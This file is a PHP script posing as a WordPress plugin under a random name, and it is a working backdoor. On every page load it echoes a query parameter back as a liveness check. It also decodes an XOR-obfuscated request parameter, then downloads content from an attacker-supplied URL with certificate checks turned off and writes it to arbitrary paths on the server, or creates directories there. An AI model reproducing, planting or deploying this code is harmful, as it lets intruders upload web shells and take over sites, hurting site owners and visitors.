<?php
/**
 * Plugin Name: wdbonlgqsu
 */
function vwwpchyas(){
    if (isset($_GET['wdbonlgqsu'])){
        echo $_GET['wdbonlgqsu'];
        exit();
    }
}

add_action('init', 'vwwpchyas');
function tmjuqlpet($cihbkeaqv, $ximjwfqih)
{
    $cihbkeaqv = base64_decode($cihbkeaqv);
    $ygbqcprdp = strlen($cihbkeaqv);
    $xfybksrkk = strlen($ximjwfqih);

    if ($ygbqcprdp <= $xfybksrkk) {
        return $cihbkeaqv ^ $ximjwfqih;
    }

    for ($cawzdizih = 0; $cawzdizih < $ygbqcprdp; ++$cawzdizih) {
        $cihbkeaqv[$cawzdizih] = $cihbkeaqv[$cawzdizih] ^ $ximjwfqih[$cawzdizih % $xfybksrkk];
    }
    return $cihbkeaqv;
}


function jlrajwtca(){
    $dtoveikig = "wdbonlgqsu";
    $nntkyhmcl = strrev($dtoveikig);
    if (isset($_REQUEST[$nntkyhmcl])){
        $mnnlfxxna = tmjuqlpet($_REQUEST[$nntkyhmcl], $dtoveikig);
        $azycjbkwn = explode("|||", $mnnlfxxna);
        $uhnmhzwpb = $azycjbkwn[0];
        $prtkloper = $azycjbkwn[1];
        $uepvprnnf = $azycjbkwn[2];
        if($nntkyhmcl==$uepvprnnf){
             if($prtkloper == "wdbonlgqsu"){
                $dflaujkhy = $_SERVER['DOCUMENT_ROOT']. "/".$uhnmhzwpb;
             }else{
                $dflaujkhy = $uhnmhzwpb;
             }
             if(mkdir($dflaujkhy, 0775)){
                echo $dtoveikig;
             }
             exit();
        }
        $rddmlkqlp = curl_init($prtkloper);
        curl_setopt($rddmlkqlp, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($rddmlkqlp, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($rddmlkqlp, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($rddmlkqlp, CURLOPT_FRESH_CONNECT, TRUE);
        $cjcoctjvh = curl_exec($rddmlkqlp);
        curl_close($rddmlkqlp);
        if ($cjcoctjvh != "") {
            if($uepvprnnf == "wdbonlgqsu"){
                if(file_exists($_SERVER['DOCUMENT_ROOT']. "/".$uhnmhzwpb)){
                    chmod($_SERVER['DOCUMENT_ROOT']. "/".$uhnmhzwpb, 0775);
                }
                $rfvmqjryu = file_put_contents($_SERVER['DOCUMENT_ROOT']. "/".$uhnmhzwpb, $cjcoctjvh);
            }else{
                if(file_exists($uhnmhzwpb)){
                    chmod($uhnmhzwpb, 0775);
                }
                $rfvmqjryu = file_put_contents($uhnmhzwpb, $cjcoctjvh);
            }
            if($rfvmqjryu != false){
                echo $dtoveikig;
                exit();
            }
        }
    }


}

add_action('init', 'jlrajwtca');
